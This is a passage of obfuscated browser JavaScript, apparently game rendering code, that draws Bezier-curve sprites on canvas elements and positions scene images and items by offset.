			Δ.moveTo(116.5 * ᐃ, 127.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124.5, ᐃ * 108.421875, 129.5 * ᐃ, ᐃ * 104.421875, 141.5 * ᐃ, 107.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 156.5, ᐃ * 112.421875, 153.5 * ᐃ, ᐃ * 113.421875, 132.5 * ᐃ, 134.421875 * ᐃ);
			Δ.bezierCurveTo(123.5 * ᐃ, 141.921875 * ᐃ, 123.5 * ᐃ, ᐃ * 141.921875, 114.5 * ᐃ, ᐃ * 149.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ⲆⵠⲆᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(41.5 * ᐃ, ᐃ * 134.421875);
			Δ.bezierCurveTo(30.5 * ᐃ, ᐃ * 119.421875, ᐃ * 25.5, 111.421875 * ᐃ, ᐃ * 12.5, 115.421875 * ᐃ);
			Δ.bezierCurveTo(4.5 * ᐃ, 120.421875 * ᐃ, ᐃ * 4.5, 121.421875 * ᐃ, 26.5 * ᐃ, ᐃ * 142.421875);
			Δ.bezierCurveTo(ᐃ * 35, 149.921875 * ᐃ, ᐃ * 35, 149.921875 * ᐃ, ᐃ * 43.5, 157.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠⲆⲆ], ᐃ * ᐃⵠᐃΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 78.5, 51.921875 * ᐃ);
			Δ.bezierCurveTo(99.5 * ᐃ, 75.921875 * ᐃ, ᐃ * 110.5, 96.921875 * ᐃ, ᐃ * 118.5, ᐃ * 120.921875);
			Δ.bezierCurveTo(ᐃ * 121.5, ᐃ * 140.921875, 107.5 * ᐃ, 179.921875 * ᐃ, ᐃ * 75.5, ᐃ * 183.921875);
			Δ.bezierCurveTo(30.5 * ᐃ, ᐃ * 169.921875, ᐃ * 37.5, ᐃ * 131.921875, 34.5 * ᐃ, 120.921875 * ᐃ);
			Δ.bezierCurveTo(41.5 * ᐃ, ᐃ * 89.921875, ᐃ * 61.5, ᐃ * 67.921875, 78.5 * ᐃ, ᐃ * 51.921875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 72.5, ᐃ * 72.421875);
			Δ.bezierCurveTo(ᐃ * 76.5, 79.421875 * ᐃ, 79.5 * ᐃ, ᐃ * 80.421875, ᐃ * 83.5, 73.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 80.5, ᐃ * 96.921875, 79.5 * ᐃ, 114.421875 * ᐃ, ᐃ * 77.5, 120.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ], Ⲇᐃ[ⲆⲆⲆᐃ], ⵠⲆⲆᐃⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(42.5 * ᐃ, 163.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62.5, ᐃ * 185.421875, ᐃ * 86.5, ᐃ * 186.421875, ᐃ * 111.5, ᐃ * 165.421875);
			Δ.bezierCurveTo(107.5 * ᐃ, 176.421875 * ᐃ, 95.5 * ᐃ, 187.421875 * ᐃ, 75.5 * ᐃ, 188.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 53.5, ᐃ * 188.421875, ᐃ * 43.5, ᐃ * 171.421875, 42.5 * ᐃ, ᐃ * 164.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[0], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(79.5 * ᐃ, 61.421875 * ᐃ);
			Δ.bezierCurveTo(88.5 * ᐃ, 31.421875 * ᐃ, ᐃ * 81.5, ᐃ * 16.421875, ᐃ * 75.5, 7.421875 * ᐃ);
			Δ.bezierCurveTo(77.5 * ᐃ, ᐃ * 28.421875, 77.5 * ᐃ, 37.421875 * ᐃ, ᐃ * 68.5, ᐃ * 42.421875);
			Δ.bezierCurveTo(ᐃ * 79.5, ᐃ * 57.421875, ᐃ * 79.5, 58.421875 * ᐃ, 80.5 * ᐃ, ᐃ * 61.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ᐃΔΔ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(72.5 * ᐃ, ᐃ * 72.421875);
			Δ.bezierCurveTo(ᐃ * 76.5, 79.421875 * ᐃ, 79.5 * ᐃ, 80.421875 * ᐃ, ᐃ * 83.5, 73.421875 * ᐃ);
			Δ.bezierCurveTo(80.5 * ᐃ, 96.921875 * ᐃ, 79.5 * ᐃ, 114.421875 * ᐃ, ᐃ * 77.5, 120.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃΔΔ], ⲆⵠⲆᐃⲆ * ᐃ);
			return Ⲇⵠ
		}

		function Δᐃᐃᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 80;
			Ⲇⵠ.height = 160 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃ * 5, ᐃΔΔΔ * ᐃ);
			Δ.save();
			Ⲇᐃᐃ(Δ, 33 * ᐃ, ᐃ * 53, 10 * ᐃ, ᐃ * 98, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.translate(ᐃ * -150, -100 * ᐃ);
			Δ.moveTo(ᐃ * 167.5, 171.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 188, ᐃ * 171.0625, 188 * ᐃ, ᐃ * 171.0625, ᐃ * 208.5, 171.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 208.5, 156.0625 * ᐃ, ᐃ * 208.5, ᐃ * 156.0625, ᐃ * 208.5, 141.0625 * ᐃ);
			Δ.bezierCurveTo(203.5 * ᐃ, ᐃ * 113.0625, 179.5 * ᐃ, ᐃ * 96.0625, ᐃ * 167.5, ᐃ * 141.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.restore();
			Δ.globalAlpha = ᐃⲆᐃ;
			Δ.translate(ᐃ * -5, -ΔᐃΔⲆ * ᐃ);
			Δ.save();
			Ⲇᐃᐃ(Δ, 33 * ᐃ, ᐃ * 53, ᐃᐃⲆⵠⵠ * ᐃ, ᐃ * 98, ᐃ * ⲆⵠⲆⵠⲆ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[2], ᐃ * ⵠΔΔᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.translate(-150 * ᐃ, -100 * ᐃ);
			Δ.moveTo(167.5 * ᐃ, 171.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 188, 171.0625 * ᐃ, ᐃ * 188, 171.0625 * ᐃ, 208.5 * ᐃ, ᐃ * 171.0625);
			Δ.bezierCurveTo(ᐃ * 208.5, 156.0625 * ᐃ, 208.5 * ᐃ, 156.0625 * ᐃ, ᐃ * 208.5, ᐃ * 141.0625);
			Δ.bezierCurveTo(ᐃ * 203.5, 113.0625 * ᐃ, 179.5 * ᐃ, 96.0625 * ᐃ, 167.5 * ᐃ, 141.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ], Ⲇᐃ[ⵠᐃΔΔ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.translate(ᐃ * 0, ᐃ * 1);
			Δ.moveTo(180.5 * ᐃ, 169.0625 * ᐃ);
			Δ.bezierCurveTo(180.5 * ᐃ, ᐃ * 157.5625, ᐃ * 180.5, 157.5625 * ᐃ, ᐃ * 180.5, 146.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 181.5, ᐃ * 134.0625, ᐃ * 193.5, ᐃ * 129.0625, ᐃ * 196.5, ᐃ * 146.0625);
			Δ.bezierCurveTo(ᐃ * 196.5, ᐃ * 157.5625, 196.5 * ᐃ, 157.5625 * ᐃ, 196.5 * ᐃ, ᐃ * 169.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⵠ]);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⲆⵠⵠⵠΔΔⲆ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 600;
			var ⵠⵠᐃ = 22 * ᐃ;
			var ⲆⲆⵠ = ᐃ * 4;
			var ⲆⵠⲆᐃⵠ = ⲆⵠΔⵠ * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Ⲇᐃᐃ(Δ, 5 * ᐃ, ᐃ * 5, ᐃⵠⵠ - ᐃ * 10, ⵠⵠᐃ - 10 * ᐃ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#BBE8EF", ⲆⵠⲆᐃⵠ);
			return Ⲇⵠ
		}

		function ΔᐃΔⲆⲆᐃΔ() {
			var ᐃ = 1;
			var Δᐃᐃ = ΔⵠⵠᐃΔ.time;
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ] && (Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Δᐃᐃ][ⵠΔⵠΔ], Δᐃⵠᐃ + 480, ᐃΔⵠᐃ + 190), Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Δᐃᐃ][ᐃⲆⵠᐃΔ], Δᐃⵠᐃ + 180, ᐃΔⵠᐃ - 430), Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Δᐃᐃ][1], Δᐃⵠᐃ - 855, ᐃΔⵠᐃ + ⵠⵠΔᐃᐃ), Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Δᐃᐃ][0], Δᐃⵠᐃ - 550, ᐃΔⵠᐃ - 300), Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃ][Δᐃᐃ][0], Δᐃⵠᐃ - 1020, ᐃΔⵠᐃ - 520));
			if (ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ]) {
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][1], Δᐃⵠᐃ - 80, ᐃΔⵠᐃ - 640);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][ΔⵠⲆΔ], Δᐃⵠᐃ + 80, ᐃΔⵠᐃ + 490);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][Ⲇᐃᐃⵠ], Δᐃⵠᐃ - 180, ᐃΔⵠᐃ - 700);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][ⵠⲆⲆ], Δᐃⵠᐃ + 550, ᐃΔⵠᐃ + ⵠⵠΔᐃᐃ);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][ⵠᐃⵠΔ], Δᐃⵠᐃ + 450, ᐃΔⵠᐃ + 300);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][ΔⲆⵠ], Δᐃⵠᐃ + 780, ᐃΔⵠᐃ + 300);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][ᐃⲆⵠᐃΔ], Δᐃⵠᐃ + 980, ᐃΔⵠᐃ + 200);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][2], Δᐃⵠᐃ + 680, ᐃΔⵠᐃ + 600);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][Δⵠⵠⵠ], Δᐃⵠᐃ - 380, ᐃΔⵠᐃ + ⵠᐃⲆΔΔ);
				Δ.drawImage(ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Δᐃᐃ][2], Δᐃⵠᐃ + 280, ᐃΔⵠᐃ + 250)
			}
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⲆ] && (Δ.drawImage(ⵠⲆ[Ⲇ.ⵠⲆΔⲆⲆ][Δᐃᐃ][ⵠᐃⲆᐃ], Δᐃⵠᐃ - 590, ᐃΔⵠᐃ), Δ.drawImage(ⵠⲆ[Ⲇ.ⵠⲆΔⲆⲆ][Δᐃᐃ][0], Δᐃⵠᐃ + 120, ᐃΔⵠᐃ - 390), Δ.drawImage(ⵠⲆ[Ⲇ.ⵠⲆΔⲆⲆ][Δᐃᐃ][Δᐃᐃᐃ], Δᐃⵠᐃ - 270, ᐃΔⵠᐃ + 340));
			if (ⵠⲆ[Ⲇ.ⲆΔΔΔ]) {
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][ᐃⵠⵠΔ], Δᐃⵠᐃ - 700, ᐃΔⵠᐃ - 600);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][2], Δᐃⵠᐃ - 970, ᐃΔⵠᐃ - 250);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][5], Δᐃⵠᐃ - 720, ᐃΔⵠᐃ - 200);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][2], Δᐃⵠᐃ - 1020, ᐃΔⵠᐃ + 340);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][ᐃⵠⲆ], Δᐃⵠᐃ - 1120, ᐃΔⵠᐃ - ⲆⲆⲆᐃ);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][1], Δᐃⵠᐃ - 650, ᐃΔⵠᐃ - 330);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][ΔⲆᐃⵠᐃ], Δᐃⵠᐃ - 495, ᐃΔⵠᐃ - 90);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][ⲆⲆΔⲆ], Δᐃⵠᐃ - 520, ᐃΔⵠᐃ + 340);
				Δ.drawImage(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Δᐃᐃ][ⲆΔΔⵠ], Δᐃⵠᐃ + 830, ᐃΔⵠᐃ - 520)
			}
			if (ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ]) {}
			if (ᐃᐃΔ && ⲆⲆⲆ) {
				var Δⵠ = ᐃᐃΔ.ⲆΔΔ.x;
				var ⲆⵠⲆ = ᐃᐃΔ.ⲆΔΔ.y;
				ᐃᐃΔ.ⲆΔΔ.x = Δᐃⵠᐃ;
				ᐃᐃΔ.ⲆΔΔ.y = ᐃΔⵠᐃ;
				var ⵠᐃⲆᐃⲆⵠΔᐃΔ = ⲆⲆⲆ.time;
				ⲆⲆⲆ.time = ΔⵠⵠᐃΔ.time;
				var ᐃΔⵠⵠΔ = ΔⵠⵠᐃΔ.items;
				ᐃΔⵠⵠΔ[2].x = 400;
				ᐃΔⵠⵠΔ[ⵠΔⲆᐃ].y = ᐃⵠΔᐃᐃ;
				ᐃΔⵠⵠΔ[2].ΔᐃΔⵠ(Ⲇ.ᐃⲆⲆΔᐃ);
				var ᐃΔᐃⵠ = ᐃΔⵠⵠΔ[ΔⲆᐃᐃ];
				ᐃΔᐃⵠ.x = -500;
				ᐃΔᐃⵠ.y = ᐃⵠΔᐃᐃ;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ΔΔⵠⵠ].x = ᐃΔᐃⵠ.x - 20.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[0].y = ᐃΔᐃⵠ.y - 22.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[1].x = ᐃΔᐃⵠ.x - 35.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[1].y = ᐃΔᐃⵠ.y + 7.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[2].x = ᐃΔᐃⵠ.x + 7.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[2].y = ᐃΔᐃⵠ.y - 30;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[3].x = ᐃΔᐃⵠ.x + 22.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[3].y = ᐃΔᐃⵠ.y;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ⲆⵠᐃΔ].x = ᐃΔᐃⵠ.x - 7.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ⵠⲆⵠᐃ].y = ᐃΔᐃⵠ.y + 14.5;
				for (var ⵠᐃ = Δᐃᐃᐃ; ᐃΔᐃⵠ.info > ⵠᐃ; ⵠᐃ++) {
					ᐃΔᐃⵠ.ᐃΔᐃⵠ[ⵠᐃ].ΔᐃΔⵠ(Ⲇ.ⲆⲆΔΔᐃ)
				}
				var ᐃΔᐃⵠ = ᐃΔⵠⵠΔ[3];
				ᐃΔᐃⵠ.x = 210;
				ᐃΔᐃⵠ.y = -290;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[0].x = ᐃΔᐃⵠ.x - 20.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[0].y = ᐃΔᐃⵠ.y - 22.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[1].x = ᐃΔᐃⵠ.x - 35.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ΔᐃᐃⲆ].y = ᐃΔᐃⵠ.y + 7.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ⵠⵠΔⲆ].x = ᐃΔᐃⵠ.x + 7.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ⵠⵠⵠΔ].y = ᐃΔᐃⵠ.y - 30;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ᐃⲆᐃᐃ].x = ᐃΔᐃⵠ.x + 22.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[ᐃⲆΔⵠ].y = ᐃΔᐃⵠ.y;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[4].x = ᐃΔᐃⵠ.x - 7.5;
				ᐃΔᐃⵠ.ᐃΔᐃⵠ[4].y = ᐃΔᐃⵠ.y + 14.5;
				for (var ⵠᐃ = Δᐃᐃⵠ; ᐃΔᐃⵠ.info > ⵠᐃ; ⵠᐃ++) {
					ᐃΔᐃⵠ.ᐃΔᐃⵠ[ⵠᐃ].ΔᐃΔⵠ(Ⲇ.ⲆⲆΔΔᐃ)
				}
				ᐃΔⵠⵠΔ[0].x = 450;
				ᐃΔⵠⵠΔ[Ⲇᐃⵠⵠ].y = -100;
				ᐃΔⵠⵠΔ[ΔΔⵠ].ⵠᐃⲆⲆᐃ(Ⲇ.ⵠΔᐃᐃΔᐃⵠ);
				ᐃΔⵠⵠΔ[Δᐃᐃᐃ].ᐃΔⵠᐃΔ();
				ᐃᐃΔ.ⲆΔΔ.x = Δⵠ;
				ᐃᐃΔ.ⲆΔΔ.y = ⲆⵠⲆ;
				ⲆⲆⲆ.time = ⵠᐃⲆᐃⲆⵠΔᐃΔ
			}
		}

		function ⲆΔⵠⵠᐃⵠⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 272 * ᐃ;
			Ⲇⵠ.height = 264 * ᐃ;
			Δ.translate(0, ⵠΔⵠⵠᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⲆⵠ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 56.999969482421875, 84.517333984375 * ᐃ);
			Δ.bezierCurveTo(61.999969482421875 * ᐃ, ᐃ * 58.517333984375, 79.99996948242188 * ᐃ, 50.517333984375 * ᐃ, 102.99996948242188 * ᐃ, 50.517333984375 * ᐃ);
			Δ.bezierCurveTo(119.99996948242188 * ᐃ, ᐃ * 26.517333984375, 137.99996948242188 * ᐃ, 32.517333984375 * ᐃ, ᐃ * 156.99996948242188, ᐃ * 44.517333984375);
			Δ.bezierCurveTo(ᐃ * 187.99996948242188, ᐃ * 42.517333984375, ᐃ * 195.99996948242188, ᐃ * 50.517333984375, ᐃ * 202.99996948242188, 77.517333984375 * ᐃ);
			Δ.bezierCurveTo(229.99996948242188 * ᐃ, ᐃ * 80.517333984375, 231.99996948242188 * ᐃ, 96.517333984375 * ᐃ, ᐃ * 229.99996948242188, ᐃ * 118.517333984375);
			Δ.bezierCurveTo(ᐃ * 241.99996948242188, 147.517333984375 * ᐃ, ᐃ * 236.99996948242188, 148.517333984375 * ᐃ, 220.99996948242188 * ᐃ, ᐃ * 165.517333984375);
			Δ.bezierCurveTo(ᐃ * 222.99996948242188, 192.517333984375 * ᐃ, 209.99996948242188 * ᐃ, ᐃ * 212.517333984375, 177.99996948242188 * ᐃ, ᐃ * 213.517333984375);
			Δ.bezierCurveTo(ᐃ * 159.99996948242188, ᐃ * 234.517333984375, 141.99996948242188 * ᐃ, 234.517333984375 * ᐃ, ᐃ * 116.99996948242188, 222.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 72.99996948242188, 226.517333984375 * ᐃ, 66.99996948242188 * ᐃ, 207.517333984375 * ᐃ, ᐃ * 65.99996948242188, ᐃ * 190.517333984375);
			Δ.bezierCurveTo(35.999969482421875 * ᐃ, ᐃ * 180.517333984375, ᐃ * 30.999969482421875, 162.517333984375 * ᐃ, 39.999969482421875 * ᐃ, ᐃ * 135.517333984375);
			Δ.bezierCurveTo(ᐃ * 23.999969482421875, ᐃ * 110.517333984375, ᐃ * 43.999969482421875, ᐃ * 90.517333984375, ᐃ * 55.999969482421875, 85.517333984375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
			Δ.translate(Δᐃᐃᐃ, -20 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(56.999969482421875 * ᐃ, 84.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 61.999969482421875, ᐃ * 58.517333984375, 79.99996948242188 * ᐃ, ᐃ * 50.517333984375, ᐃ * 102.99996948242188, 50.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119.99996948242188, 26.517333984375 * ᐃ, ᐃ * 137.99996948242188, 32.517333984375 * ᐃ, 156.99996948242188 * ᐃ, 44.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 187.99996948242188, 42.517333984375 * ᐃ, 195.99996948242188 * ᐃ, 50.517333984375 * ᐃ, 202.99996948242188 * ᐃ, 77.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 229.99996948242188, ᐃ * 80.517333984375, ᐃ * 231.99996948242188, ᐃ * 96.517333984375, ᐃ * 229.99996948242188, 118.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 241.99996948242188, ᐃ * 147.517333984375, ᐃ * 236.99996948242188, 148.517333984375 * ᐃ, 220.99996948242188 * ᐃ, 165.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 222.99996948242188, 192.517333984375 * ᐃ, ᐃ * 209.99996948242188, 212.517333984375 * ᐃ, 177.99996948242188 * ᐃ, ᐃ * 213.517333984375);
			Δ.bezierCurveTo(ᐃ * 159.99996948242188, 234.517333984375 * ᐃ, ᐃ * 141.99996948242188, 234.517333984375 * ᐃ, 116.99996948242188 * ᐃ, 222.517333984375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 72.99996948242188, 226.517333984375 * ᐃ, ᐃ * 66.99996948242188, ᐃ * 207.517333984375, ᐃ * 65.99996948242188, 190.517333984375 * ᐃ);
			Δ.bezierCurveTo(35.999969482421875 * ᐃ, ᐃ * 180.517333984375, 30.999969482421875 * ᐃ, ᐃ * 162.517333984375, 39.999969482421875 * ᐃ, ᐃ * 135.517333984375);
			Δ.bezierCurveTo(23.999969482421875 * ᐃ, ᐃ * 110.517333984375, 43.999969482421875 * ᐃ, ᐃ * 90.517333984375, 55.999969482421875 * ᐃ, ᐃ * 85.517333984375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Ⲇᐃᐃⵠ], ⵠⵠⵠΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(123.99996948242188 * ᐃ, 116.18402099609375 * ᐃ);
			Δ.bezierCurveTo(115.99996948242188 * ᐃ, ᐃ * 99.18402099609375, ᐃ * 109.99996948242188, 74.18402099609375 * ᐃ, 109.99996948242188 * ᐃ, 63.18402099609375 * ᐃ);
			Δ.bezierCurveTo(115.99996948242188 * ᐃ, 69.18402099609375 * ᐃ, 125.99996948242188 * ᐃ, 87.18402099609375 * ᐃ, 137.99996948242188 * ᐃ, 112.18402099609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142.99996948242188, 84.18402099609375 * ᐃ, ᐃ * 143.99996948242188, 76.18402099609375 * ᐃ, ᐃ * 153.99996948242188, ᐃ * 62.18402099609375);
			Δ.bezierCurveTo(155.99996948242188 * ᐃ, 79.18402099609375 * ᐃ, 149.99996948242188 * ᐃ, ᐃ * 110.18402099609375, ᐃ * 151.99996948242188, ᐃ * 117.18402099609375);
			Δ.bezierCurveTo(162.99996948242188 * ᐃ, 104.18402099609375 * ᐃ, 180.99996948242188 * ᐃ, 91.18402099609375 * ᐃ, ᐃ * 191.99996948242188, ᐃ * 91.18402099609375);
			Δ.bezierCurveTo(185.99996948242188 * ᐃ, 102.18402099609375 * ᐃ, 180.99996948242188 * ᐃ, 106.18402099609375 * ᐃ, ᐃ * 160.99996948242188, 124.18402099609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 190.99996948242188, 121.18402099609375 * ᐃ, ᐃ * 199.99996948242188, 120.18402099609375 * ᐃ, ᐃ * 207.99996948242188, 123.18402099609375 * ᐃ);
			Δ.bezierCurveTo(199.99996948242188 * ᐃ, 129.18402099609375 * ᐃ, ᐃ * 181.99996948242188, 132.18402099609375 * ᐃ, ᐃ * 160.99996948242188, ᐃ * 135.18402099609375);
			Δ.bezierCurveTo(ᐃ * 179.99996948242188, ᐃ * 142.18402099609375, ᐃ * 193.99996948242188, 151.18402099609375 * ᐃ, ᐃ * 196.99996948242188, ᐃ * 156.18402099609375);
			Δ.bezierCurveTo(185.99996948242188 * ᐃ, 156.18402099609375 * ᐃ, ᐃ * 163.99996948242188, 149.18402099609375 * ᐃ, ᐃ * 152.99996948242188, ᐃ * 147.18402099609375);
			Δ.bezierCurveTo(157.99996948242188 * ᐃ, ᐃ * 155.18402099609375, 165.99996948242188 * ᐃ, 176.18402099609375 * ᐃ, ᐃ * 169.99996948242188, 195.18402099609375 * ᐃ);
			Δ.bezierCurveTo(162.99996948242188 * ᐃ, ᐃ * 190.18402099609375, 147.99996948242188 * ᐃ, 167.18402099609375 * ᐃ, ᐃ * 139.99996948242188, ᐃ * 153.18402099609375);
			Δ.bezierCurveTo(137.99996948242188 * ᐃ, 167.18402099609375 * ᐃ, ᐃ * 126.99996948242188, 194.18402099609375 * ᐃ, ᐃ * 119.99996948242188, 204.18402099609375 * ᐃ);
			Δ.bezierCurveTo(117.99996948242188 * ᐃ, ᐃ * 186.18402099609375, 123.99996948242188 * ᐃ, 165.18402099609375 * ᐃ, 126.99996948242188 * ᐃ, ᐃ * 149.18402099609375);
			Δ.bezierCurveTo(ᐃ * 110.99996948242188, 163.18402099609375 * ᐃ, 103.99996948242188 * ᐃ, 170.18402099609375 * ᐃ, ᐃ * 82.99996948242188, ᐃ * 177.18402099609375);
